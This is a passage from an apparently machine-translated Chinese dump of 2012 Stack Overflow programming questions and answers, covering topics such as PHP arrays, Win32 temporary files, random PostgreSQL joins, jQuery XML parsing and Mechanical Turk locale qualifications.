循环遍历其中一个字段，然后从另一个字段中提取相应的值。

```
$result = array();
foreach($_POST['mytext'] as $k=>$v){
    $result[] = array($v, $_POST['mysel'][$k]);
} 
```

您也可以使用它`array_map`来执行此操作：

```
// PHP 5.3+
$result = array_map(function($a, $b){
    return array($a, $b);
}, $_POST['mytext'], $_POST['mysel']);

// PHP <= 5.2
$result = array_map(create_function('$a,$b', 'return array($a,$b);'), $_POST['mytext'], $_POST['mysel']); 
```

# wpf - WPF：是否可以在 UniformGrid 中进行行/列跨度？

> ID：10603452
> 
> 赞同：18
> 
> 时间：2012-05-15T14:57:22.210
> 
> 标签：wpf, xaml, row, uniformgrid

是否可以在 UniformGrid 中进行行/列跨度？使用网格附加属性

> Grid.RowSpan

和

> Grid.ColumnSpan

不适用于 UniformGrid。

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-05-15T15:12:12.460

不，没有附加的属性可以让你这样做。

您可以创建 UniformGrid 的子类并添加它们，但您必须处理子控件的所有排列。

当必须换行到下一行时，很难定义跨越多列的元素应该发生什么。

# c++ - 仅在同一进程中多次打开临时文件

> ID：10603459
> 
> 赞同：0
> 
> 时间：2012-05-15T14:57:34.220
> 
> 标签：c++, winapi, file-io, temporary-files

我有一个关于`FILE_ATTRIBUTE_TEMPORARY`标记文件的问题。首先，这是我想要做的：

我有一个 DLL，它采用文件名，并在内部打开该文件并从中读取。我不知道这个文件是如何在里面处理的。我要提供给该 DLL 的文件将由我的进程创建。它必须是一个临时文件，并且它的数据必须只保存在 RAM 中，并且不能被其他进程访问。所以我使用 Win32函数`CreateFile()`和`FILE_ATTRIBUTE_TEMPORARY`. `FILE_FLAG_DELETE_ON_CLOSE`到目前为止，这很好。

我有一个 tes 代码，我在其中测试文件是否可以在仍然打开的情况下再次访问。这里是：

```
HANDLE WINHandle = CreateFile("TempFileWIN.txt", (GENERIC_WRITE | GENERIC_READ) ,(FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE), 0, CREATE_ALWAYS, (FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE), 0);

ifstream ifs("TempFileWIN.txt", (ios::in | ios::trunc));

if(ifs.is_open())
{
    cout << "Success!" << endl;
}
else if(ifs.fail())
{
    cout << "Failed!" << endl;
} 
```

我正在使用 fstream 来测试文件是否可以用流打开。上面的代码不起作用。输出为“失败！”。我知道，该文件可以用 CreateFile 再次打开。我检查过了。但是想知道是否可以通过与（例如）fstream 一起使用的外部 DLL 打开文件。

我希望你能帮我解决这个问题。此致。

编辑：也许一个更好的问题是我如何将文件锁定到我的进程并确保它永远不能被其他进程访问（即使我的进程被杀死）。该文件必须可以使用 C++ fstream 对象打开。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-16T08:40:44.337

如果我是你，我会保留打开文件的句柄，并将其传递给 DLL 代码，而不使用文件名，因为如果你尝试访问临时文件，你可能会在某些时候遇到访问限制，使用“正常”文件访问权限删除关闭文件。

如本答案所述，可以在 fstream 对象中使用 Windows 句柄：[https ://stackoverflow.com/a/476014/393701](https://stackoverflow.com/a/476014/393701)

# c - 哈希函数中的 get16bits 宏

> ID：10603462
> 
> 赞同：0
> 
> 时间：2012-05-15T14:57:47.230
> 
> 标签：c, hash

前几天我在查看哈希函数，偶然发现了一个网站，其中有一个例子。大多数代码都很容易掌握，但是这个宏功能我真的无法理解。

有人可以分解这里发生了什么吗？

```
#define get16bits(d) ((((uint32_t)(((const uint8_t *)(d))[1])) << 8) +(uint32_t)(((const uint8_t *)(d))[0])) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:09:53.913

该宏或多或少等同于：

```
static uint32_t get16bits(SOMETYPE *d)
{
unsigned char temp[ sizeof *d];
uint32_t val;

memcpy(temp, d, sizeof *d);

val = (temp[0] << 8)
     + temp[1];
return val;
} 
```

，但宏参数没有类型，而函数参数有。

另一种方法是实际投射：

```
static uint32_t get16bits(SOMETYPE *d)
{
unsigned char *cp = (unsigned char*) d;
uint32_t val;

val = (cp[0] << 8)
     + cp[1];
return val;
} 
```

，这也显示了弱点：通过使用 1 进行索引，代码假定 sizeof (*d) 至少为 2。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T15:14:26.940

基本上它得到 32 位整数 d 的低 16 位

让我们分解一下

```
#define get16bits(d) ((((uint32_t)(((const uint8_t *)(d))[1])) << 8) +(uint32_t)(((const uint8_t *)(d))[0]))
uint32_t a = 0x12345678;
uint16_t b = get16bits(&a); // b == 0x00005678 
```

首先我们必须传递 a 的地址，`get16bits()`否则它将不起作用。

```
(((uint32_t)(const uint8_t *)(d))[1])) << 8 
```

这首先将 32 位整数转换为 8 位整数数组并检索 2 个整数。然后它将值移动 8 位，因此它并将低 8 位添加到它

```
+ (uint32_t)(((const uint8_t *)(d))[0])) 
```

在我们的示例中，它将是

```
uint8_t tmp[4] = (uint8_t *)&a;
uint32_t result;
result = tmp[1] << 8; // 0x00005600
result += tmp[0]; //tmp[0] == 0x78
// result is now 0x00005678 
```

# iphone - UIButton 阴影看起来不正确

> ID：10603463
> 
> 赞同：4
> 
> 时间：2012-05-15T14:57:52.630
> 
> 标签：iphone, objective-c, ios, core-graphics

我正在尝试向 UIButton 图层添加阴影，但由于某种原因，它会在按钮的边界处切断。我将 clipsToBounds 设置为关闭，所以我不确定为什么它看起来像这样：

![在此处输入图像描述](../Images/332a2a027d62393cfeb58a2a989db39c.png)

它是方形的，就像那样，即使阴影不应该是方形的......它应该是柔和和褪色的。

```
button.clipsToBounds = NO;
button.layer.masksToBounds = NO;
button.layer.shadowOffset = CGSizeZero;
button.layer.shadowPath = [UIBezierPath bezierPathWithRect:button.layer.bounds].CGPath;
button.layer.shadowOpacity = 0.7;
button.layer.shadowColor = [UIColor blackColor].CGColor;
button.layer.shadowRadius = 10; 
```

我错过了什么吗？

哦，我的按钮是 UIButton 的子类。我不确定这是否会有所不同.. - 即使 shadowRadius 为 0.0，我也会得到一个完全可见的黑色方块作为我的阴影

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:00:23.573

`clipsToBounds`将允许在按钮边界之外绘制任何子视图。

看起来它不适用于您的图层:(

你可能只需要让你的按钮更大一点（或者你的影子更小！）

# sql - 逻辑运算符 sql 查询异常错误

> ID：10603465
> 
> 赞同：0
> 
> 时间：2012-05-15T14:58:04.267
> 
> 标签：sql, forms, sqlite, blackberry

我试图通过提供日期范围从我的 sqlite 数据库中获取结果。我已经能够通过提供 3 个过滤器来获取结果

```
 1\. Name (textfield1) 
        2\. From (date)(textfield2)
        3\. To   (date)(textfield3) 
```

我正在使用以下代码将从表单中获取的这些字段值插入表 temp

```
 Statement statement6 = db.createStatement("INSERT INTO Temp(date,amount_bill,narration) select date,amount,narration from Bills where name=\'"+TextField1.getText()+"\' AND substr(date,7)||substr(date,4,2)||substr(date,1,2) <= substr (\'"+TextField3.getText()+"\',7)||substr (\'"+TextField3.getText()+"\',4,2)||substr (\'"+TextField3.getText()+"\',1,2) AND substr(date,7)||substr(date,4,2)||substr(date,1,2) >= substr (\'"+TextField2.getText()+"\',7)||substr (\'"+TextField2.getText()+"\',4,2)||substr (\'"+TextField2.getText()+"\',1,2) ");
                    statement6.prepare();
                    statement6.execute();       
                    statement6.close(); 
```

现在，如果我在我的表单中为上述过滤器输入以下输入

```
 1.Ricky
               2.01/02/2012
               3.28/02/2012 
```

它完美地获取这些日期范围之间的日期。但现在我想插入低于和高于提供的这两个日期范围的值。

![在此处输入图像描述](../Images/d41156338da522b275b6e901fa8dfcf6.png)

我试过使用这段代码。但它没有显示任何结果。我根本不知道错误在哪里

以下代码用于查找日期小于 01/02/2012 且大于 28/02/2012 的条目。

```
 Statement statementVII = db.createStatement("INSERT INTO Temp5(date,amount_rec,narration) select date,amount,narration from Bills where name=\'"+TextField1.getText()+"\' AND substr(date,7)||substr(date,4,2)||substr(date,1,2) < substr (\'"+TextField2.getText()+"\',7)||substr (\'"+TextField2.getText()+"\',4,2)||substr (\'"+TextField2.getText()+"\',1,2) AND substr(date,7)||substr(date,4,2)||substr(date,1,2) > substr (\'"+TextField3.getText()+"\',7)||substr (\'"+TextField3.getText()+"\',4,2)||substr (\'"+TextField3.getText()+"\',1,2)");
                    statementVII.prepare();
                    statementVII.execute();       
                    statementVII.close(); 
```

有人对此有意见，请指导。谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T15:07:55.413

您需要将 Or 子句与括号一起使用：

```
WHERE name='....' AND (yourDateField<yourLowerDate OR yourDateField>yourHigherDate) 
```

# android - 无法将我的视图保存到图像，但可以保存其他视图

> ID：10603473
> 
> 赞同：0
> 
> 时间：2012-05-15T14:58:26.687
> 
> 标签：android, view, webview, bitmap

这是我的代码的一部分，如果我在其他代码中的另一个活动中使用该代码，例如：

```
 case R.id.buttonMinus: 
```

它工作得很好，它只保存该特定按钮的背景。如果我在图形视图中使用它，它总是以“Error1”结束。（Graphview 是将图形绘制到画布中的视图）

另外，我想在应用程序的某个不同位置显示图片，我一直在尝试通过

```
myWebView.loadUrl(Environment.getExternalStorageDirectory()+ File.separator + "DivePlanner" + File.separator + "Dive.png"); 
```

但没有运气

我整天都被困在这个问题上，如果有人可以提供帮助，请提前致谢！

```
buttonClick.performClick(); 
```

}

```
public void onClick(View v) {

    String[] verlabels = new String[] {"0m", Float.toString(-max/2) + "m", Float.toString(-max) + "m"};
    String[] horlabels = new String[] {"0 min",Float.toString((int)x[pocetBodu]/2)+" min",Float.toString((int)x[pocetBodu])+" min"};
    GraphView graphView = new GraphView(this, y, "Dive Manager",horlabels, verlabels, GraphView.LINE,x,Pspotreba,pocetBodu,pocetUseku);
    setContentView(graphView);

    if(Save)
    {
        graphView.buildDrawingCache();
        Bitmap bm=graphView.getDrawingCache();

        OutputStream fOut = null;
        Uri outputFileUri;
        try {
                File root = new File(Environment.getExternalStorageDirectory()+ File.separator + "DivePlanner" + File.separator);
                root.mkdirs();
                File sdImageMainDirectory = new File(root, "Dive.png");
                outputFileUri = Uri.fromFile(sdImageMainDirectory);
                fOut = new FileOutputStream(sdImageMainDirectory);
           }
        catch (Exception e) {
                Toast.makeText(this, "Error", Toast.LENGTH_SHORT).show();
           }

        try {
                bm.compress(Bitmap.CompressFormat.PNG, 100, fOut);
                fOut.flush();
                fOut.close();
                Toast.makeText(this, "Ponor uložen", Toast.LENGTH_SHORT).show();
           } 
        catch (Exception e) {
            Toast.makeText(this, "Error1", Toast.LENGTH_SHORT).show();
           }
    } 
```

# jquery - 如何解析这个 XML ajax 响应？

> ID：10603475
> 
> 赞同：4
> 
> 时间：2012-05-15T14:58:29.133
> 
> 标签：jquery, xml, ajax, parsing

我正在尝试使用 jQuery 从 Java servlet 或操作中通过 ajax 检索来解析一些数据。这是我最糟糕的一周，一切都很顺利。这是我的 XML 响应：

```
<ajax-response>
    <response>
        <item>
            <name>ok</name>
            <value>true</value>
        </item>
        <item>
            <name>menuDiv</name>
            <value> Some HTML Menu</value>
        </item>
    </response>
</ajax-response> 
```

我试图只获得“Some HTML”的“menuDiv”值：

```
$.ajax({
    type: "GET",
    url: basePath+'mostrarMenu.do',
    dataType: "xml",
    success: parseXml
});

function parseXml (xml) {
    var menu = $(xml).find("item");
    menu.each(function(i, value) {
        alert(value[0]);
        if (value == 'menuDiv') {
            alert("Esto es el menudiv:"+value);
        }

        if (( value != null ) || ( value != '') || ( value != ' ')) {
            $('#menuDiv').append(value);
        } 
        else 
            alert ("anda el else");
    }); 
```

`alert(value[0]);`并且`if ( value == 'menuDiv') {`什么都不返回，最后一个`if`使菜单可见，但其他项目也是如此，就像一个`true`出现在漂亮菜单前的单词一样。

任何帮助或建议将不胜感激。谢谢。

## 编辑2：

使用此功能，现在我得到纯文本（未呈现的 html）和所有“< items >”：

```
function parseXml (xml) {
        var menu = $(xml).find("item");
        menu.each(function(i, value){
            if(( value != null ) || ( value != '') || ( value != ' ')){
                $('#menuDiv').append($(value));
            } else alert ("anda el else");
        });
     }
    } 
```

**我更改了 dataType: 'html' 并且我的菜单是可见的，但我继续尝试在我的 XML 上只选择一个项目，而不是所有项目......**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:37:02.767

第一个问题是，当你这样做时`find("item")`，返回的是整个子树：

```
 <item>
        <name>ok</name>
        <value>true</value>
    </item> 
```

因此，您的循环需要更改为：

```
if ($(value).find("name")[0].innerHTML == 'menuDiv') {
    alert("Esto es el menudiv:"+value);
} 
```

然后可以在中获得值“Some HTML Menu”`value.find("value")[0].innerHTML`

我在这里没有做任何错误检查（具体来说，我假设`find`返回一个包含至少一个元素的非空数组），但你可以自己添加它。

# sql - 如何在 PostgreSQL 中获得随机笛卡尔积？

> ID：10603479
> 
> 赞同：12
> 
> 时间：2012-05-15T14:58:36.810
> 
> 标签：sql, postgresql, join, random, cartesian-product

我有两张桌子，`custassets`和`tags`。为了生成一些测试数据，我想做`INSERT INTO`一个多对多表，其中 a`SELECT`从每个表中获取随机行（以便一个表中的随机主键与第二个表中的随机主键配对）。令我惊讶的是，这并不像我最初想象的那么容易，所以我坚持用它来自学。

这是我的第一次尝试。我选择 10`custassets`和 3 `tags`，但在每种情况下都相同。我会很好地修复第一个表，但我想随机分配分配的标签。

```
SELECT
    custassets_rand.id custassets_id,
    tags_rand.id tags_rand_id
FROM
    (
        SELECT id FROM custassets WHERE defunct = false ORDER BY RANDOM() LIMIT 10
    ) AS custassets_rand
,
    (
        SELECT id FROM tags WHERE defunct = false ORDER BY RANDOM() LIMIT 3
    ) AS tags_rand 
```

这会产生：

```
custassets_id | tags_rand_id 
---------------+--------------
          9849 |         3322  }
          9849 |         4871  } this pattern of tag PKs is repeated
          9849 |         5188  }
         12145 |         3322
         12145 |         4871
         12145 |         5188
         17837 |         3322
         17837 |         4871
         17837 |         5188
.... 
```

然后我尝试了以下方法：在列列表中进行第二次`RANDOM()`调用。`SELECT`然而这个更糟糕，因为它选择了一个标签 PK 并坚持下去。

```
SELECT
    custassets_rand.id custassets_id,
    (SELECT id FROM tags WHERE defunct = false ORDER BY RANDOM() LIMIT 1) tags_rand_id
FROM
    (
        SELECT id FROM custassets WHERE defunct = false ORDER BY RANDOM() LIMIT 30
    ) AS custassets_rand 
```

结果：

```
 custassets_id | tags_rand_id 
---------------+--------------
         16694 |         1537
         14204 |         1537
         23823 |         1537
         34799 |         1537
         36388 |         1537
.... 
```

这在脚本语言中很容易，而且我确信使用存储过程或临时表可以很容易地完成。但是我可以只用一个`INSERT INTO SELECT`吗？

我确实考虑过使用随机函数选择整数主键，但不幸的是，两个表的主键在增量序列中都有间隙（因此可能在每个表中选择一个空行）。不然就好了！

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-15T19:57:15.427

[更新以用通常更快的子查询替换 CTE。]

为了产生**真正的随机**`rn`组合，对更大的集合进行随机化就足够了：

```
SELECT c_id, t_id
FROM  (
   SELECT id AS c_id, row_number() OVER (ORDER BY random()) AS rn
   FROM   custassets
   ) x
JOIN   (SELECT id AS t_id, row_number() OVER () AS rn FROM tags) y USING (rn); 
```

如果*任意*组合足够好，这会更快（尤其是对于大表）：

```
SELECT c_id, t_id
FROM   (SELECT id AS c_id, row_number() OVER () AS rn FROM custassets) x
JOIN   (SELECT id AS t_id, row_number() OVER () AS rn FROM tags) y USING (rn); 
```

如果两个表中的行数不匹配，并且您不想丢失较大表中的行，请使用[模运算符**`%`**](https://www.postgresql.org/docs/current/interactive/functions-math.html)多次连接较小表中的行：

```
SELECT c_id, t_id
FROM  (
   SELECT id AS c_id, row_number() OVER () AS rn
   FROM   custassets -- table with fewer rows
   ) x
JOIN  (
   SELECT id AS t_id, (row_number() OVER () % small.ct) + 1 AS rn
   FROM   tags
       , (SELECT count(*) AS ct FROM custassets) AS small
   ) y USING (rn); 
```

正如我在评论中提到的，[窗口函数（带有附加`OVER`子句）](https://www.postgresql.org/docs/current/interactive/functions-window.html)在 PostgreSQL 8.4 或更高版本中可用。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-15T20:02:31.820

```
WITH a_ttl AS (
    SELECT count(*) AS ttl FROM custassets c),
b_ttl AS (
    SELECT count(*) AS ttl FROM tags),
rows AS (
    SELECT gs.*
      FROM generate_series(1,
           (SELECT max(ttl) AS ttl FROM
              (SELECT ttl FROM a_ttl UNION SELECT ttl FROM b_ttl) AS m))
           AS gs(row)),
tab_a_rand AS (
    SELECT custassets_id, row_number() OVER (order by random()) as row
      FROM custassets),
tab_b_rand AS (
    SELECT id, row_number() OVER (order by random()) as row
      FROM tags)
SELECT a.custassets_id, b.id
  FROM rows r
  JOIN a_ttl ON 1=1 JOIN b_ttl ON 1=1
  LEFT JOIN tab_a_rand a ON a.row = (r.row % a_ttl.ttl)+1
  LEFT JOIN tab_b_rand b ON b.row = (r.row % b_ttl.ttl)+1
 ORDER BY 1,2; 
```

[您可以在SQL Fiddle](http://www.sqlfiddle.com/#!1/9112b/1)上测试此查询。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-25T15:33:15.497

这是一种从 2 个表中随机选择单个组合的不同方法，假设两个表`a`和`b`，都具有主键`id`。这些表不必具有相同的大小，并且第二行是从第一行独立选择的，这对于测试数据可能并不那么重要。

```
SELECT * FROM a, b 
 WHERE a.id = (
    SELECT id 
    FROM a 
    OFFSET (
        SELECT random () * (SELECT count(*) FROM a)
    ) 
    LIMIT 1) 
 AND b.id = (
    SELECT id 
    FROM b 
    OFFSET (
        SELECT random () * (SELECT count(*) FROM b)
        ) 
    LIMIT 1); 
```

用两张表进行测试，一张有 7000 行，一张有 100k 行，结果：立即。对于多个结果，您必须重复调用查询 - 增加 LIMIT 并更改`x.id =`为`x.id IN`会产生 (aA, aB, bA, bB) 结果模式。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-16T12:05:07.597

只是一个简单的 carthesian 产品 ON random() 似乎工作得相当好。简单的来吧您好...

```
-- Cartesian product
-- EXPLAIN ANALYZE
INSERT INTO dirgraph(point_from,point_to,costs)
SELECT p1.the_point , p2.the_point, (1000*random() ) +1
FROM allpoints p1
JOIN allpoints p2 ON random() < 0.002
        ; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-15T16:20:02.873

如果您只想从每一侧获取一组随机行，请使用伪随机数生成器。我会使用类似的东西：

```
select *
from (select a.*, row_number() over (order by NULL) as rownum -- NULL may not work, "(SELECT NULL)" works in MSSQL
      from a
     ) a cross join
     (select b.*,  row_number() over (order by NULL) as rownum
      from b
     ) b
where a.rownum <= 30 and b.rownum <= 30 
```

这是一个笛卡尔积，假设 a 和 b 至少有 30 行，则返回 900 行。

但是，我将您的问题解释为随机组合。再一次，我会选择伪随机方法。

```
select *
from (select a.*, row_number() over (order by NULL) as rownum -- NULL may not work, "(SELECT NULL)" works in MSSQL
      from a
     ) a cross join
     (select b.*,  row_number() over (order by NULL) as rownum
      from b
     ) b
where modf(a.rownum*107+b.rownum*257+17, 101) < <some vaue> 
```

这让你得到任意行之间的组合。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-15T15:22:47.413

让我感到困扰的是，经过这么多年的关系数据库，似乎没有很好的跨数据库方式来做这样的事情。MSDN 文章[http://msdn.microsoft.com/en-us/library/cc441928.aspx](http://msdn.microsoft.com/en-us/library/cc441928.aspx)似乎有一些有趣的想法，但那当然不是 PostgreSQL。即使那样，他们的解决方案也需要一次通过，而我认为它应该能够在没有扫描的情况下完成。

我可以想象一些没有通过（在选择中）的方法，但它会涉及创建另一个表，将表的主键映射到随机数（或稍后随机选择的线性序列，在某些方面实际上可能更好），当然，这也可能有问题。

我意识到这可能是一个无用的评论，我只是觉得我需要咆哮一下。

# java - Mule 3：如何从 MuleMessage 中获取 HTTP 标头

> ID：10603483
> 
> 赞同：2
> 
> 时间：2012-05-15T14:58:51.663
> 
> 标签：java, mule

给定一个`MuleMessage`从 HTTP 请求创建的对象，如何获取请求的 HTTP 标头？我正在使用骡子 3.2.1。谢谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-16T17:34:29.960

HTTP 标头存储为入站范围的属性。它们的属性名称以 . 为前缀`http.`。例如：

```
MuleMessage message = ...
String contentType = (String)message.getInboundProperty("http.Content-Type"); 
```

但在“http.”中还有其他与 HTTP 相关的属性。属性命名空间，例如状态代码的“http.status”和请求 URL 的“http.request”。因此，虽然可以检索*单个*标头，但没有可靠、自动的方法来获取所有 HTTP 标头的*列表*。

这个问题[将在 Mule 3.3 中修复](http://www.mulesoft.org/documentation/display/MULECDEV/HTTP+properties+usability+improvement)。Mule 3.3 将更好地组织 HTTP 相关的属性。例如，所有标头都将存储在名为“http.headers”的属性中，所有查询字符串参数将被解析并存储在“http.query.params”中。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-15T16:25:30.477

所有 HTTP 标头都在`MuleMessage`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-05-26T03:06:45.270

您也可以通过输入日志消息进行检查

```
<logger message="=============test= #[message.inboundProperties]" level="INFO" doc:name="Logger"/> 
```

让我知道这是否适合你。

谢谢

# ruby-on-rails - WSF / WSO2 是否与 ruby 1.9.3p0 兼容？

> ID：10603486
> 
> 赞同：0
> 
> 时间：2012-05-15T14:58:58.243
> 
> 标签：ruby-on-rails, ruby, wso2

我在这里与 WSF 合作：[http ://wso2.org/project/wsf/ruby/1.1.0/docs/manual.html](http://wso2.org/project/wsf/ruby/1.1.0/docs/manual.html)

该文档引用了 1.8.5 或更高版本，但我遇到了 1.9.3p0 的问题。谁能确认这个框架与 ruby​​ 1.9.3 不兼容？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-16T16:20:34.267

WSF/Ruby 框架很可能与 1.9.3p0 不兼容。1.8.5 或更高版本的声明是基于 WSF/Ruby 将保持向后兼容的假设。由于该项目没有积极的开发，因此以后的 Ruby 版本的任何问题都可能无法修复。

# javascript - Rel PreRender/PreFetch，它执行 JS 吗？

> ID：10603489
> 
> 赞同：8
> 
> 时间：2012-05-15T14:59:13.420
> 
> 标签：javascript, preloading, prefetch, prerender

```
<!—Firefox Prefetching -->
<link rel="prefetch" href="http://www.example.com/page2.html">

<!—Chrome Prefetching -->
<link rel="prerender" href="http://www.example.com/page2.html"> 
```

如果我在页面上有 Javascript 进行预渲染/预取（例如 Google Analytics JS），预渲染/预取是否会在页面上执行 Javascript？或者它会延迟 JS 的任何执行，直到用户实际请求页面？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-15T15:52:59.653

我刚刚对此进行了更多研究：

`Prefetch`将加载通常只是 HTML 页面的顶级资源

`Prerender`也将获取子元素，并将执行 Javascript 代码。使用页面可见性 API，我们可以确定加载页面的当前可见性状态。

所以答案是肯定的，只要用户在 Chrome 上并且正在使用 prerender，它就会执行 JS。此外，当前版本的 Google Analytics（分析）充分利用了 Page Visibility API，因此统计数据不会出现偏差，但是很可能有很多代码由于未正确处理预渲染的情况而导致统计数据出现偏差。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T15:31:09.240

不，预取只是缓存文件，它不执行它包含的 javascript。

据我所知，analytics.js 在您请求时不会分析网站。它在执行 javascript 时有效。当浏览器预取（请求）analytics.js 文件时，并不意味着执行了 analytics.js 文件。因此，在用户实际请求页面之前，您网站的 Google Analytics 数据不会受到预取方法的影响。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T15:36:54.683

在这个主题[上，规范](http://www.whatwg.org/specs/web-apps/current-work/#link-type-prefetch)是沉默的，只是简单地说：

> prefetch 关键字表示抢先获取和缓存指定资源可能是有益的，因为用户很可能需要此资源。

由此我们可以说 JS 在预取页面中的执行是*未定义*的。

浏览器供应商是否看到在预取页面中执行 JS 的好处取决于供应商。

# mechanicalturk - 允许多个语言环境作为 Mechanical Turk 中的资格测试

> ID：10603494
> 
> 赞同：4
> 
> 时间：2012-05-15T14:59:23.877
> 
> 标签：mechanicalturk

我想要一个要求用户在美国或加拿大的 HIT。我正在使用命令行工具，但似乎任何资格都被视为*全部*必需 - 我想要一个布尔值*或*. 这可能吗？

例如，在`.properties`文件中，我有：

```
# Worker_NumberHITsApproved > 100
qualification.1:00000000000000000040
qualification.comparator.1:GreaterThan
qualification.value.1:100

# Worker_PercentAssignmentsApproved > 95%
qualification.2:000000000000000000L0
qualification.comparator.2:GreaterThan
qualification.value.2:95

# Worker_Locale
qualification.3:00000000000000000071
qualification.comparator.3:EqualTo
qualification.locale.3:US 
```

所有这三个资格都是必需的。假设我想要求前两个，然后是`US`or的语言环境`CA`。这有语法吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-08-04T15:58:03.757

Mechanical Turk[现在](http://mechanicalturk.typepad.com/blog/2014/07/new-qualification-comparators-add-greater-flexibility-to-qualifications-.html)支持允许多个语言环境的新比较器`In`和比较器。`NotIn`这是来自该链接的示例 SOAP 请求，它需要来自美国、加拿大或英国的工作人员：

```
<QualificationRequirement>
   <QualificationTypeId>00000000000000000071</QualificationTypeId>
   <Comparator>In</Comparator>
   <LocaleValue>US</LocaleValue>
   <LocaleValue>CA</LocaleValue>
   <LocaleValue>UK</LocaleValue>
</QualificationRequirement> 
```

另请参阅[AWS MTurk 文档](http://docs.aws.amazon.com/AWSMechTurk/latest/AWSMturkAPI/ApiReference_QualificationRequirementDataStructureArticle.html#ApiReference_QualificationRequirementDataStructureArticle-the-locale-qualification)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-22T21:39:08.430

更新：可能已经解决了这种不足，请参阅[dmcc 的答案](https://stackoverflow.com/a/25122804/85950)以获取更多信息。

* * *

我觉得你运气不好。从[API 文档](http://docs.amazonwebservices.com/AWSMechTurk/latest/AWSMturkAPI/ApiReference_QualificationRequirementDataStructureArticle.html)（强调添加）：

> ### 地区资格
> 
> ……剪……
> 
> **注意**
> 工人必须满足 HIT 的所有资格要求才能获得 HIT 资格。这意味着**您不能指定多个 locale Qualification 要求**，因为给定的 Worker 将只能满足其中一项要求。**没有办法让不同地区的工人有资格获得单个 HIT。**

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-01-30T15:06:17.717

[TurkPrime.com](https://www.turkprime.com)使用 Web 界面提供此功能以及更多功能。您可以排除和包括工作人员、向他们发送电子邮件、重新开始调查等。

我和我的同事已经使用了一段时间，并且非常喜欢它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-11-16T17:57:58.790

这个问题及其答案在这一点上已经相当老了，但我无法找到专门针对命令行工具的解决方案。幸运的是，我在玩了一段时间后能够弄清楚。在您的`.properties`文件中：

```
# user must be located in the US or Canada
qualification.1:00000000000000000071
qualification.comparator.1:In
qualification.locale.1.1:US
qualification.locale.1.2:CA 
```

一个相当温和的解决方案，但在我看来没有很好的记录:)

# google-maps - Google Maps API v3 - 如何将地图保存到 cookie/localstorage

> ID：10603498
> 
> 赞同：3
> 
> 时间：2012-05-15T14:59:32.897
> 
> 标签：google-maps, google-maps-api-3

我正在构建一个加载谷歌地图的页面，在侧面的另一个 div 上有街景，我想保存这些数据，所以如果用户关闭他的浏览器窗口然后回来，它会在没有需要再次调用 Google Map API。

我已经尝试保存 div 内容并将其替换为当前的内容，以防用户已经访问过。我尝试使用 cookie，但由于 4kb 的大小限制而无法保存太多信息，并且我尝试了 localStorage (HTML5)，但它没有按预期工作。

有任何想法吗？谢谢

# vb.net - 如何循环和写入所有 HTTp 标头名称/值对

> ID：10603502
> 
> 赞同：1
> 
> 时间：2012-05-15T14:59:39.693
> 
> 标签：vb.net, http-headers

我正在开发一个 vb.net 2.0 应用程序并尝试读取 HTTP 标头。我可以通过 Request.Headers.Get("HTTP_VARIABLE_NAME") 获取标头值。我想使用 Headers 属性获取所有标题名称/值对，并在给定页面的按钮单击事件下的单独页面上显示。

请问如何循环并写入所有名称/值对？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T22:57:42.080

直接取自[MSDN](http://msdn.microsoft.com/en-us/library/system.web.httprequest.headers%28v=vs.80%29.aspx)，因此所有功劳都归功于可怜的微软员工，他被赋予了记录 system.net 命名空间的艰巨任务。虽然我确实觉得我可以自己写一个更好的例子......

> 以下代码示例显示 HTTP 请求中所有标头的名称和值

```
Dim loop1, loop2 As Integer
 Dim arr1(), arr2() As String
 Dim coll As NameValueCollection

' Load Header collection into NameValueCollection object.
coll=Request.Headers

' Put the names of all keys into a string array.
arr1 = coll.AllKeys 
For loop1 = 0 To arr1.GetUpperBound(0)
   Response.Write("Key: " & arr1(loop1) & "<br>")
   arr2 = coll.GetValues(loop1) 
   ' Get all values under this key.
   For loop2 = 0 To arr2.GetUpperBound(0)
      Response.Write("Value " & CStr(loop2) & ": " & Server.HtmlEncode(arr2(loop2)) & "<br>")
    Next loop2
 Next loop1 
```

我不知道您所说的“写入页面”是什么意思，但这应该可以帮助您入门。

Is there a reason that forces you to use .NET 2? .NET 4 is still supported on Windows XP SP3 and up and offers many advantages over previous versions. Just putting it out there.

# iphone - iAd + mobclix 分离整合

> ID：10603503
> 
> 赞同：0
> 
> 时间：2012-05-15T14:59:42.047
> 
> 标签：iphone, ios, iad, ads, mobclix

我是广告行业的新手，我编写了两个小 ios 游戏来测试广告的有用性以及它们获得的收入。我对性能印象非常深刻，所以我想出售我 5 个月大的音乐应用程序的免费版本，以增加付费销售并从免费版本的广告中获得一点收入。

问题：这两个实时应用程序通过 mobclix 集成了 iAD，我关闭了自动优化以处理网络。但我经常看到 iAD 测试广告。Mobclix 说当 iAD 无法将 AD 发送到下一个网络时，一定是有问题，除此之外我住在奥地利（不支持 iAD），并且 mobclix 说他们不会从国家/地区向苹果发送请求它们不受支持，但它们确实...

